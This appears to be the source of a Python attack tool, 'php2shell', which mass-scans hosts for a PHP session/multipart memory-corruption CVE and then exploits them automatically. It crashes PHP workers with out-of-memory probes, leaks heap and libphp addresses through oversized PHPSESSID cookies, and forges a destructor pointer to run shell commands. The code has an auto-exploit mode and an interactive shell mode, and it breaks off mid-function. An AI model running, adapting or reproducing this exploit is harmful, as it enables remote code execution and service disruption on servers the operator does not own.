#!/usr/bin/env python3
"""php2shell: scan targets for CVE-2026-109618/109619, then verify RCE.

Feed a list of hosts. The scanner fingerprints PHP and (unless --safe) sends
the OOM differential probes. A host is reported vulnerable only on strong
evidence: an advertised unpatched version, a PHPSESSID memory leak, or a
session-destruction failure. A crash alone is reported as LIKELY unless a
same-size plain-body control shows the crash is specific to the probe.
High-confidence hosts are exploited as soon as they are found: the embedded
exploit runs `id>./<proof>` and the proof is fetched over HTTP, so the uid
output is printed as confirmation.

The exploit chain is adapted from godylockz/cve-2026-109618-php2shell
(three stages: heap leak, libphp leak, forged pDestructor -> system).
It is calibrated for php:8.4.26-apache / mod_php prefork on Linux. Other
builds need matching --zif-offset/--dtor-offset/--htdata-offset (or a local
replica container via --container).

Only use this against systems you are authorized to test. The active scan
and the exploit are disruptive: they can exhaust PHP memory and kill workers.

Usage:
  ./php2shell.py -f hosts.txt
  ./php2shell.py -f hosts.txt --safe
  ./php2shell.py -u https://target/ --shell
  ./php2shell.py -f hosts.txt --container php2shell-target   # local lab offsets
"""
from __future__ import annotations

import argparse
import http.client
import json
import os
import random
import re
import secrets
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import lru_cache
from pathlib import Path
from typing import Optional

# --------------------------------------------------------------------------
# Scan
# --------------------------------------------------------------------------

FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_PATTERN = re.compile(r"PHP[/ ]?(\d+)\.(\d+)\.(\d+)", re.IGNORECASE)
DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 PHP2Shell/1.0"
)
CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
CONTROL_BOUNDARY = "x"
NESTED_KEYS = 62
PROBES = ((1, 4000), (8, 1020), (20, 1020))
REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}
TRANSIENT_STATUSES = {429, 503}
SESSION_COOKIE_ANOMALY_BYTES = 128
DESTRUCTION_FAILED = b"Session object destruction failed"
CDN_MARKERS = ("cf-ray", "akamai", "sucuri", "fastly", "cloudfront", "incapsula")
PACER: "Optional[Pacer]" = None

# --------------------------------------------------------------------------
# Exploit (adapted from godylockz/cve-2026-109618-php2shell)
# --------------------------------------------------------------------------

BOOKWORM = {
    "stage1_n": 841,
    "stage2_t": 406,
    "stage2_v": 16,
    "htdata_offset": 0x690D8,
    "stage3_pads": [(31, 31)] * 6,
    "stage3_carrier": True,
}
# Verified on php:8.4.26-apache pulled 2026-10-22 (Apache 2.4.69, Debian 12).
ZIF_OFFSET_DEFAULT = 0x465370
DTOR_OFFSET_DEFAULT = 0x65EB60
MAX_CMD = 14
SID = b"p2s" + secrets.token_hex(7).encode()


class ScanResult:
    def __init__(self, url: str) -> None:
        self.url = url
        self.vulnerable = False
        self.likely = False
        self.confidence = "NONE"
        self.verdict = "NO SIGNAL"
        self.reason = ""
        self.powered_by = ""
        self.server = ""
        self.headers: dict[str, str] = {}
        self.memory_limit: Optional[int] = None
        self.error = ""


def version_verdict(version: Optional[tuple[int, int, int]]) -> Optional[str]:
    if version is None:
        return None
    major, minor, patch = version
    if major < 5 or (major == 5 and minor < 4):
        return None
    if major < 8 or (major == 8 and minor < 2):
        return "VULNERABLE"
    fixed = FIXED_VERSIONS.get((major, minor))
    if fixed is None:
        return None
    return "FIXED" if patch >= fixed else "VULNERABLE"


def parse_version(text: str) -> Optional[tuple[int, int, int]]:
    match = VERSION_PATTERN.search(text or "")
    if not match:
        return None
    return tuple(int(value) for value in match.groups())  # type: ignore[return-value]


def normalize_url(raw: str, path: str = "/") -> str:
    raw = raw.strip()
    if not raw:
        raise ValueError("empty target")
    if "://" not in raw:
        raw = "https://" + raw
    parsed = urllib.parse.urlsplit(raw)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError(f"invalid target {raw!r}")
    if parsed.path in ("", "/") and path:
        parsed = parsed._replace(path=path if path.startswith("/") else "/" + path)
    return urllib.parse.urlunsplit(
        (parsed.scheme, parsed.netloc, parsed.path, parsed.query, "")
    )


def ssl_context(insecure: bool) -> ssl.SSLContext:
    context = ssl.create_default_context()
    if insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context


class Pacer:
    """Global request pacer: smooths bursts and adds jitter.

    This is politeness towards scanned infrastructure, not WAF evasion.
    """

    def __init__(self, rate: float, jitter: float = 0.15) -> None:
        self.interval = 1.0 / rate if rate > 0 else 0.0
        self.jitter = max(0.0, min(jitter, 0.5))
        self.lock = threading.Lock()
        self.next_slot = 0.0

    def wait(self) -> None:
        if self.interval <= 0:
            return
        with self.lock:
            now = time.monotonic()
            slot = max(now, self.next_slot)
            delay = slot - now
            self.next_slot = slot + self.interval * random.uniform(
                1.0 - self.jitter, 1.0 + self.jitter
            )
        if delay > 0:
            time.sleep(delay)


def get_header(headers: dict[str, str], name: str) -> str:
    for key, value in headers.items():
        if key.lower() == name.lower():
            return value
    return ""


def retry_after_seconds(value: str) -> float:
    try:
        return max(0.0, min(float(value), 10.0))
    except (TypeError, ValueError):
        return 1.5


def http_request(
    method: str,
    url: str,
    body: bytes = b"",
    headers: Optional[dict[str, str]] = None,
    timeout: float = 60.0,
    insecure: bool = False,
    read_limit: int = 1 << 20,
) -> tuple[Optional[int], dict[str, str], bytes, Optional[str]]:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        return None, {}, b"", "invalid URL"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    request_headers = dict(headers or {})
    request_headers.setdefault("User-Agent", DEFAULT_USER_AGENT)
    request_headers.setdefault("Accept-Encoding", "identity")
    request_headers["Connection"] = "close"
    # Only retry cheap requests; re-sending a probe would OOM the worker twice.
    attempts = 2 if len(body) <= 65536 else 1
    for attempt in range(attempts):
        if PACER is not None:
            PACER.wait()
        if parsed.scheme == "https":
            connection: http.client.HTTPConnection = http.client.HTTPSConnection(
                parsed.hostname, port, timeout=timeout, context=ssl_context(insecure)
            )
        else:
            connection = http.client.HTTPConnection(
                parsed.hostname, port, timeout=timeout
            )
        try:
            connection.request(method, path, body=body, headers=request_headers)
            response = connection.getresponse()
            data = response.read(read_limit)
            status = response.status
            response_headers = {
                name: value for name, value in response.getheaders()
            }
            wait = retry_after_seconds(get_header(response_headers, "Retry-After"))
        except Exception as exc:  # network errors are scan data, not crashes
            return None, {}, b"", f"{type(exc).__name__}: {exc}"
        finally:
            connection.close()
        if status in TRANSIENT_STATUSES and attempt + 1 < attempts:
            time.sleep(wait)
            continue
        return status, response_headers, data, None
    return None, {}, b"", "request retries exhausted"


@lru_cache(maxsize=len(PROBES))
def build_probe_body(size_mib: int, parts: int) -> bytes:
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError("probe too small for part count")
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


def session_cookie_disclosure(headers: dict[str, str]) -> Optional[int]:
    for name, value in headers.items():
        if name.lower() != "set-cookie":
            continue
        match = re.search(r"(?:^|,\s*)PHPSESSID=([^;,\s]+)", value, re.IGNORECASE)
        if match and len(match.group(1)) > SESSION_COOKIE_ANOMALY_BYTES:
            return len(match.group(1))
    return None


def memory_limit_from_body(body: bytes) -> Optional[int]:
    match = re.search(rb"Allowed memory size of (\d+) bytes exhausted", body)
    return int(match.group(1)) if match else None


def has_cdn_marker(headers: dict[str, str]) -> bool:
    for name, value in headers.items():
        lowered = name.lower()
        if lowered in CDN_MARKERS:
            return True
        if lowered == "server" and any(
            marker in value.lower() for marker in ("cloudflare", "akamai", "sucuri")
        ):
            return True
    return False


def crash_signal(
    control_body: bytes,
    status: Optional[int],
    body: bytes,
    headers: dict[str, str],
) -> tuple[str, str]:
    limit = memory_limit_from_body(body)
    if limit is not None and b"Unknown" in body:
        return (
            "oom",
            f"PHP memory exhaustion while parsing the multipart body "
            f"(memory_limit={limit} bytes)",
        )
    if status == 500 and control_body and not body:
        return "empty500", "HTTP 500 with an empty body"
    if status in (502, 503, 504):
        if has_cdn_marker(headers):
            return "cdn", f"HTTP {status} from a CDN/WAF edge, not PHP"
        return "http5xx", f"HTTP {status} while the worker handled the probe"
    if status == 200 and control_body and not body:
        return "empty200", "HTTP 200 with an empty body"
    return "", ""


def apply_version(result: ScanResult, headers: dict[str, str], body: bytes) -> Optional[str]:
    powered = get_header(headers, "X-Powered-By")
    if powered:
        result.powered_by = powered
    text = body[:65536].decode("latin-1", "replace")
    version = parse_version(result.powered_by) or parse_version(text)
    if version is not None and not result.powered_by:
        match = VERSION_PATTERN.search(text)
        if match:
            result.powered_by = match.group(0)
    return version_verdict(version)


def mark_high(result: ScanResult, reason: str) -> None:
    result.vulnerable = True
    result.likely = True
    result.confidence = "HIGH"
    result.verdict = "VULNERABLE"
    result.reason = reason


@lru_cache(maxsize=2)
def build_differential_body(size: int) -> bytes:
    prefix = (
        b'--D\r\nContent-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
    )
    suffix = b"\r\n--D--\r\n"
    filler = max(0, size - len(prefix) - len(suffix))
    return prefix + (b"Z" * filler) + suffix


def differential_crashes(url: str, size: int, args: argparse.Namespace) -> Optional[bool]:
    """True when a benign multipart body of the same size also crashes.

    That means the host simply has a low memory_limit (or a broken handler),
    so a crash on the nested probe cannot be attributed to php2shell.
    """
    body = build_differential_body(size)
    status, headers, response_body, error = http_request(
        "POST",
        url,
        body,
        {"Content-Type": "multipart/form-data; boundary=D"},
        timeout=args.timeout,
        insecure=args.insecure,
    )
    if error or status is None or status in REJECTED_STATUSES:
        return None
    kind, _detail = crash_signal(b"x", status, response_body, headers)
    if kind == "cdn":
        return None
    return kind != ""


def scan_target(raw: str, args: argparse.Namespace) -> ScanResult:
    result = ScanResult(raw)
    try:
        url = normalize_url(raw, args.path)
    except ValueError as exc:
        result.error = str(exc)
        result.reason = str(exc)
        result.verdict = "ERROR"
        return result

    status, headers, body, error = http_request(
        "GET", url, timeout=args.timeout, insecure=args.insecure, read_limit=65536
    )
    if error:
        result.error = error
        result.reason = f"initial GET failed: {error}"
        result.verdict = "ERROR"
        return result
    result.headers = headers
    result.server = get_header(headers, "Server")
    verdict = apply_version(result, headers, body)

    # A known version is authoritative: probing a patched host can still OOM
    # when memory_limit is low, which is exactly the false positive we want
    # to avoid before auto-exploitation.
    if verdict == "VULNERABLE":
        mark_high(result, "advertised PHP version is unpatched: " + result.powered_by)
        return result
    if verdict == "FIXED":
        result.verdict = "FIXED"
        result.reason = "advertised PHP version is patched: " + result.powered_by
        return result
    if status in REJECTED_STATUSES:
        result.verdict = "BLOCKED"
        result.reason = f"fingerprint request rejected with HTTP {status}"
        return result
    if status is not None and status >= 500:
        result.verdict = "INCONCLUSIVE"
        result.reason = f"fingerprint request returned HTTP {status}"
        return result

    if args.safe:
        result.verdict = "INCONCLUSIVE"
        result.reason = "no PHP version advertised"
        return result

    control_headers = {
        "Content-Type": f"multipart/form-data; boundary={CONTROL_BOUNDARY}"
    }
    control_status, control_resp_headers, control_body, control_error = http_request(
        "POST",
        url,
        CONTROL_BODY,
        control_headers,
        timeout=args.timeout,
        insecure=args.insecure,
    )
    if control_status in (403, 429):
        result.verdict = "BLOCKED"
        result.reason = f"control request rejected with HTTP {control_status}"
        return result
    if control_error:
        result.error = f"control request failed: {control_error}"
        result.reason = result.error
        result.verdict = "INCONCLUSIVE"
        return result

    verdict = apply_version(result, control_resp_headers, control_body)
    if verdict == "VULNERABLE":
        mark_high(result, "advertised PHP version is unpatched: " + result.powered_by)
        return result
    if verdict == "FIXED":
        result.verdict = "FIXED"
        result.reason = "advertised PHP version is patched: " + result.powered_by
        return result

    disclosed = session_cookie_disclosure(control_resp_headers)
    if disclosed:
        mark_high(
            result,
            f"{disclosed}-byte PHPSESSID response cookie "
            "(PHP worker memory disclosure)",
        )
        return result
    if DESTRUCTION_FAILED in control_body:
        mark_high(result, "response reports 'Session object destruction failed'")
        return result

    rejected = ""
    max_mb = max(1, min(args.max_probe_mb, max(size for size, _ in PROBES)))
    probes = [probe for probe in PROBES if probe[0] <= max_mb] or [PROBES[0]]
    for size_mib, parts in probes:
        probe = build_probe_body(size_mib, parts)
        probe_status, probe_headers, probe_body, probe_error = http_request(
            "POST",
            url,
            probe,
            {"Content-Type": "multipart/form-data; boundary="},
            timeout=args.timeout,
            insecure=args.insecure,
        )
        verdict = apply_version(result, probe_headers, probe_body)
        if verdict == "VULNERABLE":
            mark_high(
                result, "advertised PHP version is unpatched: " + result.powered_by
            )
            return result
        if verdict == "FIXED":
            result.verdict = "FIXED"
            result.reason = "advertised PHP version is patched: " + result.powered_by
            return result

        disclosed = session_cookie_disclosure(probe_headers)
        if disclosed:
            mark_high(
                result,
                f"{disclosed}-byte PHPSESSID response cookie "
                "(PHP worker memory disclosure)",
            )
            return result
        if DESTRUCTION_FAILED in probe_body:
            mark_high(result, "response reports 'Session object destruction failed'")
            return result

        if probe_error:
            result.verdict = "INCONCLUSIVE"
            result.reason = f"probe failed before a response: {probe_error}"
            return result
        if probe_status in REJECTED_STATUSES:
            rejected = f"probe rejected with HTTP {probe_status}"
            break

        limit = memory_limit_from_body(probe_body)
        if limit is not None:
            result.memory_limit = limit
        kind, detail = crash_signal(control_body, probe_status, probe_body, probe_headers)
        if kind == "cdn":
            continue
        if kind:
            differential = differential_crashes(url, len(probe), args)
            if differential is True:
                result.confidence = "LOW"
                result.verdict = "INCONCLUSIVE"
                result.reason = (
                    f"{detail}, but a same-size benign multipart body also "
                    "crashed: the host has a low memory_limit or a broken "
                    "handler, so this is not attributable to php2shell"
                )
                return result
            if differential is False:
                result.likely = True
                result.confidence = "MEDIUM"
                result.verdict = "LIKELY"
                result.reason = (
                    f"{size_mib} MiB probe: {detail}; the same-size benign "
                    "control did not crash, but a CVE-specific signal "
                    "(version, cookie leak, or destruction failure) is missing"
                )
                return result
            result.confidence = "LOW"
            result.verdict = "INCONCLUSIVE"
            result.reason = f"{detail}; differential control could not be evaluated"
            return result

    if rejected:
        result.verdict = "INCONCLUSIVE"
        result.reason = rejected
    else:
        result.verdict = "NO SIGNAL"
        result.reason = "no crash and no PHP version advertised"
    return result


# --------------------------------------------------------------------------
# HTTP primitives for the exploit
# --------------------------------------------------------------------------


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + part["name"].encode() + b'"'
        if part.get("filename") is not None:
            out += b'; filename="' + part["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + part["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


class Target:
    def __init__(self, url: str, timeout: float = 30.0, insecure: bool = False):
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme not in ("http", "https"):
            raise ValueError("target must be an http:// or https:// URL")
        self.https = parsed.scheme == "https"
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or (443 if self.https else 80)
        self.path = parsed.path or "/"
        if parsed.query:
            self.path += "?" + parsed.query
        self.timeout = timeout
        self.insecure = insecure

    def _connect(self) -> socket.socket:
        last: Optional[BaseException] = None
        for _ in range(6):
            try:
                sock = socket.create_connection(
                    (self.host, self.port), timeout=self.timeout
                )
                if self.https:
                    sock = ssl_context(self.insecure).wrap_socket(
                        sock, server_hostname=self.host
                    )
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return sock
            except OSError as exc:
                last = exc
                time.sleep(0.3)
        raise last or OSError("connection failed")

    def post(
        self,
        body: bytes,
        boundary: bytes,
        read_cap: int = 1 << 20,
        timeout: Optional[float] = None,
        extra_headers: Optional[dict[str, str]] = None,
    ) -> bytes:
        extra = "".join(f"{key}: {value}\r\n" for key, value in (extra_headers or {}).items())
        host = self.host
        if self.port not in (80, 443):
            host = f"{host}:{self.port}"
        header = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        sock = self._connect()
        sock.settimeout(timeout or self.timeout)
        data = bytearray()

        def reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        thread = threading.Thread(target=reader, daemon=True)
        thread.start()
        try:
            try:
                sock.sendall(header)
                view = memoryview(body)
                for offset in range(0, len(body), 262144):
                    sock.sendall(view[offset : offset + 262144])
            except OSError:
                pass
            thread.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            sock.close()

    def get(self, path: str, read_cap: int = 65536) -> tuple[int, bytes]:
        host = self.host
        if self.port not in (80, 443):
            host = f"{host}:{self.port}"
        header = (
            f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
            "Cache-Control: no-cache\r\nConnection: close\r\n\r\n"
        ).encode()
        sock = self._connect()
        sock.settimeout(self.timeout)
        data = bytearray()
        try:
            sock.sendall(header)
            try:
                while len(data) < read_cap:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            sock.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(match.group(1)) if match else 0), body


def parse_cookie(response: bytes) -> bytes:
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", response)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    counts: dict[int, int] = {}
    for index in range(len(raw) - 8):
        value = int.from_bytes(raw[index : index + 8], "little")
        if 0x7F0000000000 <= value < 0x800000000000:
            base = value & ~0x1FFFFF
            counts[base] = counts.get(base, 0) + 1
    if not counts:
        return 0
    base, count = max(counts.items(), key=lambda item: item[1])
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int) -> int:
    if len(raw) < 16:
        return 0
    pointer = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= pointer < 0x800000000000):
        return 0
    if pointer & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = pointer - dtor_offset
    return base if base & 0xFFF == 0 else 0


class Exploit:
    def __init__(
        self,
        target: Target,
        zif_offset: int,
        dtor_offset: int,
        htdata_offset: int,
        huge_mb: int = 12,
        verbose: bool = False,
    ) -> None:
        self.target = target
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.cmd = b"id"
        self.chunk_base = 0
        self.libphp_base = 0
        self.stage1_n = BOOKWORM["stage1_n"]
        self.stage2_t = BOOKWORM["stage2_t"]
        self.stage2_v = BOOKWORM["stage2_v"]
        self.stage3_pads = list(BOOKWORM["stage3_pads"])
        self.stage3_carrier = BOOKWORM["stage3_carrier"]

    def log(self, message: str) -> None:
        if self.verbose:
            print(f"    {message}", file=sys.stderr, flush=True)

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self) -> None:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.target.post(
            build_multipart(parts, b"S" * 17),
            b"S" * 17,
            read_cap=1 << 20,
            timeout=max(90.0, self.target.timeout),
        )
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.target.post(
            build_multipart(parts, b"BNDRY12345"),
            b"BNDRY12345",
            read_cap=65536,
            timeout=20.0,
        )
        time.sleep(0.5)

    def stage1(self) -> int:
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.target.post(
            build_multipart(parts, b"S" * 17),
            b"S" * 17,
            read_cap=1 << 20,
            timeout=max(90.0, self.target.timeout),
        )
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for index in range(self.stage1_n):
            value = (f"v{index:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + index), "data": value.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        response = self.target.post(
            build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20
        )
        return chunk_base_from_cookie(parse_cookie(response))

    def stage2(self) -> int:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.target.post(
            build_multipart(parts, b"S" * 17),
            b"S" * 17,
            read_cap=1 << 20,
            timeout=max(90.0, self.target.timeout),
        )
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for index in range(983):
            count = 16 if index == self.stage2_t else 1
            for inner in range(count):
                parts.append(
                    {"name": f"a{index:04d}[{inner}]", "data": b"x" * self.stage2_v}
                )
        response = self.target.post(
            build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20
        )
        return libphp_base_from_cookie(parse_cookie(response), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(f"command is {len(cmd)} bytes; max {MAX_CMD}")
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        base = 0x20
        struct.pack_into("<Q", ht, base + 0x00, 0)
        struct.pack_into("<Q", ht, base + 0x08, 0)
        struct.pack_into("<Q", ht, base + 0x10, zif)
        struct.pack_into("<Q", ht, base + 0x18, 0)
        struct.pack_into("<Q", ht, base + 0x20, 0)
        struct.pack_into("<I", ht, base + 0x28, 0)
        struct.pack_into("<I", ht, base + 0x2C, 1)
        struct.pack_into("<Q", ht, base + 0x30, 0)
        struct.pack_into("<Q", ht, base + 0x38, 0)
        struct.pack_into("<I", ht, base + 0x40, 0)
        struct.pack_into("<Q", ht, base + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, base + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98 : 0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for index, (name_length, value_length) in enumerate(self.stage3_pads):
            name = (f"p{index:0{name_length - 1}d}" if name_length > 0 else "")[
                :name_length
            ]
            parts.append({"name": name, "data": b"V" * value_length})
        parts += [self._file_part(), self._big_field()]
        extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.stage3_carrier else None
        self.target.post(
            build_multipart(parts, b"S" * 17),
            b"S" * 17,
            read_cap=1 << 20,
            timeout=max(90.0, self.target.timeout),
            extra_headers=extra,
        )
        time.sleep(0.3)
        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for index in range(2):
                parts.append({"name": f"f{index:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for index in range(15):
                parts.append({"name": f"a{index:030d}"[:31], "data": ht})
        else:
            for index in range(15):
                parts.append({"name": f"a{index:030d}"[:31], "data": ht})
            for index in range(2):
                parts.append({"name": f"f{index:02d}", "data": ref})
        self.target.post(
            build_multipart(parts, b"B" * 10),
            b"B" * 10,
            read_cap=65536,
            timeout=30.0,
        )


class Session:
    """One exploit session; reuses leaked bases across worker rotations."""

    def __init__(
        self,
        target: Target,
        zif_offset: int,
        dtor_offset: int,
        htdata_offset: int,
        proof_name: str,
        retries: int,
        verbose: bool,
    ) -> None:
        self.exploit = Exploit(
            target, zif_offset, dtor_offset, htdata_offset, verbose=verbose
        )
        self.target = target
        self.htdata_offset = htdata_offset
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.proof_name = proof_name
        self.retries = retries
        self.verbose = verbose
        self.leaked = False

    def log(self, message: str) -> None:
        if self.verbose:
            print(f"    {message}", file=sys.stderr, flush=True)

    def _leak(self) -> bool:
        for attempt in range(1, self.retries + 1):
            self.log(f"heap leak {attempt}/{self.retries}")
            self.exploit.rotate()
            chunk = self.exploit.stage1()
            if chunk:
                self.exploit.chunk_base = chunk
                self.log(f"chunk base 0x{chunk:x}")
                break
            self.log("heap leak missed")
        if not self.exploit.chunk_base:
            return False
        self.exploit.rotate()
        for attempt in range(1, self.retries + 1):
            self.log(f"libphp leak {attempt}/{self.retries}")
            base = self.exploit.stage2()
            if base:
                self.exploit.libphp_base = base
                self.log(f"libphp base 0x{base:x}")
                break
            self.log("libphp leak missed")
            self.exploit.rotate()
        if not self.exploit.libphp_base:
            return False
        self.exploit.rotate()
        self.leaked = True
        return True

    def _fetch(self) -> Optional[bytes]:
        status, body = self.target.get("/" + self.proof_name)
        if status == 200:
            return body
        return None

    def execute(
        self, command: str, want_output: bool = True, attempts: int = 4
    ) -> Optional[bytes]:
        cmd = command.encode()
        if len(cmd) > MAX_CMD:
            raise ValueError(f"command is {len(cmd)} bytes; the limit is {MAX_CMD}")
        self.exploit.cmd = cmd
        if not self.leaked and not self._leak():
            return None
        htdata = self.exploit.chunk_base + self.htdata_offset
        zif = self.exploit.libphp_base + self.zif_offset
        for attempt in range(1, attempts + 1):
            self.log(f"stage3 {attempt}/{attempts}")
            try:
                self.exploit.stage3(htdata, zif)
            except OSError as exc:
                self.log(f"stage3 request error: {exc}")
            time.sleep(0.8)
            if want_output:
                body = self._fetch()
                if body is not None:
                    return body
                self.log("no proof file yet")
            else:
                return b""
            self.exploit.rotate()
        if want_output:
            self.log("re-leaking after stage3 failures")
            self.leaked = False
            if self._leak():
                htdata = self.exploit.chunk_base + self.htdata_offset
                zif = self.exploit.libphp_base + self.zif_offset
                for attempt in range(1, self.retries + 1):
                    self.exploit.stage3(htdata, zif)
                    time.sleep(0.8)
                    body = self._fetch()
                    if body is not None:
                        return body
                    self.exploit.rotate()
        return None


def derive_offsets_from_container(container: str) -> tuple[Optional[int], Optional[int]]:
    """Read zif_system/zval_ptr_dtor offsets from a local container's libphp.so."""
    lib = "/usr/lib/apache2/modules/libphp.so"
    handle, path = tempfile.mkstemp(prefix="libphp-", suffix=".so")
    os.close(handle)
    try:
        try:
            subprocess.run(
                ["docker", "cp", f"{container}:{lib}", path],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
        except (OSError, subprocess.SubprocessError) as exc:
            print(f"[-] docker cp failed: {exc}", file=sys.stderr)
            return None, None
        with open(path, "rb") as file:
            data = file.read()
        if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
            print("[-] libphp.so is not little-endian ELF64", file=sys.stderr)
            return None, None
        e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
        e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
        e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
        e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
        loads = []
        for index in range(e_phnum):
            offset = e_phoff + index * e_phentsize
            p_type = struct.unpack_from("<I", data, offset)[0]
            p_vaddr = struct.unpack_from("<Q", data, offset + 16)[0]
